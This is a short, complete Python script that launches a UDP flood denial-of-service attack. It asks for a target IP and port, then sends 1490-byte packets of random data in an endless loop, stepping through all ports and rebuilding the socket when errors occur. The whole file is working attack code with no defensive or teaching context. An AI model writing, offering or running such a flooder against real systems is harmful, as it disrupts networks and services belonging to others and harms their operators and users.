import socket
import random

def create_socket():
    return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

sock = create_socket()
packet = random._urandom(1490)

ip = input("Target IP: ")
port = int(input("Target Port: "))

print("\nStarting UDP flood attack...\n")

sent = 0
while True:
    try:
        sock.sendto(packet, (ip, port))
        sent += 1
        print(f"Sent {sent} packets to {ip} through port {port}")

        port += 1
        if port > 65535:
            port = 1

    except (OSError, BrokenPipeError):
        sock = create_socket()  # Recreate socket if it breaks

    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        break

    except Exception as e:
        print(f"\nError: {e}")
        break